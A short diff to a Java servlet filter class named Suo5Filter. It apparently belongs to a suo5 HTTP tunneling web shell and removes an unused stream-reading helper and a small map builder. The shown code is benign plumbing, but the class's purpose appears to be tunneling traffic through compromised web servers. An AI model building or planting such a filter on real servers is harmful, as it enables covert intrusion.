@@ -167,7 +167,6 @@ public class Suo5Filter extends ClassLoader implements Runnable, HostnameVerifie
     public void destroy() {
     }
 
-
     public void doFilter(ServletRequest sReq, ServletResponse sResp, FilterChain chain) throws IOException, ServletException {
         Object lastRequest = sReq;
         Object lastResponse = sResp;
@@ -238,23 +237,6 @@ public class Suo5Filter extends ClassLoader implements Runnable, HostnameVerifie
         }
     }
 
-
-    public void readInputStreamWithTimeout(InputStream is, byte[] b, int timeoutMillis) throws IOException, InterruptedException {
-        int bufferOffset = 0;
-        long maxTimeMillis = new Date().getTime() + timeoutMillis;
-        while (new Date().getTime() < maxTimeMillis && bufferOffset < b.length) {
-            int readLength = b.length - bufferOffset;
-            if (is.available() < readLength) {
-                readLength = is.available();
-            }
-            // can alternatively use bufferedReader, guarded by isReady():
-            int readResult = is.read(b, bufferOffset, readLength);
-            if (readResult == -1) break;
-            bufferOffset += readResult;
-            Thread.sleep(200);
-        }
-    }
-
     public void tryFullDuplex(HttpServletRequest request, HttpServletResponse response) throws IOException, InterruptedException {
         InputStream in = request.getInputStream();
         byte[] data = new byte[32];
@@ -262,12 +244,6 @@ public class Suo5Filter extends ClassLoader implements Runnable, HostnameVerifie
         OutputStream out = response.getOutputStream();
         out.write(data);
         out.flush();
-    }
-    private HashMap newCreate(byte s) {
-        HashMap m = new HashMap();
-        m.put("ac", new byte[]{0x04});
-        m.put("s", new byte[]{s});
-        return m;
     }
 
     private HashMap newData(byte[] data) {
